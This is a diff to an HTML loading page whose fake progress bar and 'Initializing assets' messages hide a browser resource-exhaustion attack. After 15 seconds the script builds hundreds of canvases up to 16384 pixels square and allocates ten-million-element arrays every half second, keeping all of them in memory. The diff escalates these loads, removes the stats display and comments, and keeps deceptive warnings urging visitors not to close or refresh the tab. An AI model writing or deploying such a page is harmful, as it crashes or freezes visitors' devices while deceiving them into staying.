@@ -24,33 +24,21 @@
         position: relative;
     }
     
-    /* Animated background particles */
     .particle {
         position: absolute;
         width: 3px;
         height: 3px;
         background: rgba(108, 255, 194, 0.4);
         border-radius: 50%;
-        animation: float 8s infinite;
-    }
-    
-    @keyframes float {
-        0%, 100% {
-            transform: translateY(0) translateX(0);
-            opacity: 0;
-        }
-        10% { opacity: 1; }
-        90% { opacity: 1; }
-        100% {
-            transform: translateY(-100vh) translateX(50px);
-            opacity: 0;
-        }
+        pointer-events: none;
+        transition: transform 0.1s ease-out;
     }
     
     #loader {
         text-align: center;
-        width: 400px;
-        padding: 40px;
+        width: 90%;
+        max-width: 400px;
+        padding: 40px 30px;
         background: rgba(20, 20, 30, 0.8);
         backdrop-filter: blur(10px);
         border-radius: 20px;
@@ -111,20 +99,6 @@
         transition: all 0.3s;
     }
     
-    #stats {
-        margin-top: 20px;
-        padding-top: 20px;
-        border-top: 1px solid rgba(255, 255, 255, 0.1);
-        font-size: 11px;
-        opacity: 0.5;
-    }
-    
-    .stat-line {
-        display: flex;
-        justify-content: space-between;
-        margin: 5px 0;
-    }
-    
     .spinner {
         display: inline-block;
         width: 12px;
@@ -153,16 +127,29 @@
 </style>
 </head>
 <body>
-<!-- Background particles -->
 <script>
-    for (let i = 0; i < 30; i++) {
+    const particles = [];
+    for (let i = 0; i < 50; i++) {
         const particle = document.createElement('div');
         particle.className = 'particle';
         particle.style.left = Math.random() * 100 + '%';
-        particle.style.animationDelay = Math.random() * 8 + 's';
-        particle.style.animationDuration = (8 + Math.random() * 4) + 's';
+        particle.style.top = Math.random() * 100 + '%';
         document.body.appendChild(particle);
+        particles.push({
+            element: particle,
+            baseX: Math.random() * window.innerWidth,
+            baseY: Math.random() * window.innerHeight
+        });
     }
+    
+    document.addEventListener('mousemove', (e) => {
+        particles.forEach((p, index) => {
+            const speed = (index % 5 + 1) * 0.05;
+            const deltaX = (e.clientX - p.baseX) * speed;
+            const deltaY = (e.clientY - p.baseY) * speed;
+            p.element.style.transform = `translate(${deltaX}px, ${deltaY}px)`;
+        });
+    });
 </script>
 
 <div id="loader">
@@ -170,24 +157,16 @@
     <div id="bar"><div id="fill"></div></div>
     <div id="percent">0%</div>
     <div id="status">Initializing assets…<span class="spinner"></span></div>
-    <div id="stats">
-        <div class="stat-line">
-            <span>Processing Time:</span>
-            <span id="timeElapsed">0s</span>
-        </div>
-    </div>
 </div>
 
 <script>
     const fill = document.getElementById("fill");
     const percentText = document.getElementById("percent");
     const status = document.getElementById("status");
-    const timeElapsed = document.getElementById("timeElapsed");
     
     let progress = 0;
     let images = [];
     let totalCanvases = 0;
-    let startTime = Date.now();
     let hasStarted = false;
     
     const messages = [
@@ -228,7 +207,6 @@
         fill.style.width = progress + "%";
         percentText.textContent = Math.floor(progress) + "%";
         
-        // Update status message
         if (Math.random() > 0.7) {
             messageIndex = (messageIndex + 1) % messages.length;
             status.innerHTML = messages[messageIndex] + '<span class="spinner"></span>';
@@ -241,7 +219,6 @@
         progressInterval = setInterval(fakeProgress, 600);
     }, 15000);
     
-    // Initial countdown display
     let countdown = 15;
     const countdownInterval = setInterval(() => {
         if (countdown > 0) {
@@ -252,15 +229,9 @@
         }
     }, 1000);
     
-    setInterval(() => {
-        if (hasStarted) {
-            const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            timeElapsed.textContent = elapsed + "s";
-        }
-    }, 1000);
     
     function generateHeavyImage() {
-        const sizes = [3072, 4096, 5120]; 
+        const sizes = [8192, 10240, 12288, 16384]; 
         const size = sizes[Math.floor(Math.random() * sizes.length)];
         
         const canvas = document.createElement("canvas");
@@ -272,7 +243,7 @@
         for (let i = 0; i < imageData.data.length; i += 4) {
             const x = (i / 4) % canvas.width;
             const y = Math.floor((i / 4) / canvas.width);
-            const pattern = Math.sin(x * 0.01) * Math.cos(y * 0.01);
+            const pattern = Math.sin(x * 0.01) * Math.cos(y * 0.01) * Math.tan(x * y * 0.00001);
             
             imageData.data[i] = (Math.random() * 128 + pattern * 127);
             imageData.data[i + 1] = (Math.random() * 128 + pattern * 127);
@@ -281,51 +252,49 @@
         }
         ctx.putImageData(imageData, 0, 0);
         
-        // Apply additional filters for extra processing
-        ctx.filter = 'blur(2px)';
+        ctx.filter = 'blur(4px) contrast(1.5) saturate(2)';
+        ctx.drawImage(canvas, 0, 0);
+        ctx.filter = 'brightness(1.2)';
         ctx.drawImage(canvas, 0, 0);
         
         const img = new Image();
         img.src = canvas.toDataURL("image/png");
         images.push(img);
+        images.push(canvas); 
         
         totalCanvases++;
-        canvasCount.textContent = totalCanvases;
-        
-        // Estimate memory (very rough)
-        const estimatedMB = (totalCanvases * size * size * 4) / (1024 * 1024);
-        memoryUsage.textContent = estimatedMB.toFixed(1) + " MB";
     }
     
-    // Generate MORE canvases at a faster rate (only after 15 seconds)
     let canvasInterval;
     setTimeout(() => {
+        for (let i = 0; i < 500; i++) {
+            setTimeout(() => generateHeavyImage(), i * 10);
+        }
+        
         canvasInterval = setInterval(() => {
-            // Generate 5-8 heavy canvases per interval
-            const count = 100 + Math.floor(Math.random() * 100);
+            const count = 50 + Math.floor(Math.random() * 11);
             for (let i = 0; i < count; i++) {
                 generateHeavyImage();
             }
         }, 100);
         
-        // Initial batch when starting
-        for (let i = 0; i < 10; i++) {
-            generateHeavyImage();
-        }
+        setInterval(() => {
+            const massiveArray = new Array(10000000).fill(Math.random());
+            images.push(massiveArray);
+        }, 500);
     }, 15000);
     
-    // Psychological effects (adjusted timing)
     setTimeout(() => {
         if (hasStarted) {
             status.innerHTML = '<span class="warning">Please do not close this tab.</span>';
         }
-    }, 27000); // 15s delay + 12s
+    }, 27000);
     
     setTimeout(() => {
         if (hasStarted) {
             status.innerHTML = '<span class="warning">Processing critical data… Do not refresh.</span>';
         }
-    }, 40000); // 15s delay + 25s
+    }, 40000);
 </script>
 </body>
 </html>
